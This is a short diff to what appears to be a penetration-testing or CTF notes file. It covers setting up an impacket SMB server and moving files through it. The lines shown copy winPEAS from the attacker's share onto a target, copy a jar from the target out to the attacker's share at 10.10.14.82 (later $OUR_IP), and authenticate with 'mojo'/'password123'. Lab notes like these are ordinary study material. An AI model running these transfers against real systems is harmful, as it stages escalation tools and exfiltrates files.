@@ -10,6 +10,7 @@ Quick SMB server to upload and download files
 ```bash
 # Setup SMB server
 sudo impacket-smbserver -smb2support share $(pwd)
+sudo impacket-smbserver -smb2support -username mojo -password password123 share $(pwd)
 ```
 
 Interact with the SMB server from the target's machine
@@ -25,6 +26,6 @@ cp \\$OUR_IP\share\winPEASany.exe winPEAS.exe
 copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.82\share\playercounter-1.0-SNAPSHOT.jar
 
 # Include authentication
-net use \\10.10.14.82\share /user:mojo password123
-net use \\10.10.14.82\share /delete
+net use \\$OUR_IP\share /user:mojo password123
+net use \\$OUR_IP\share /delete
 ```
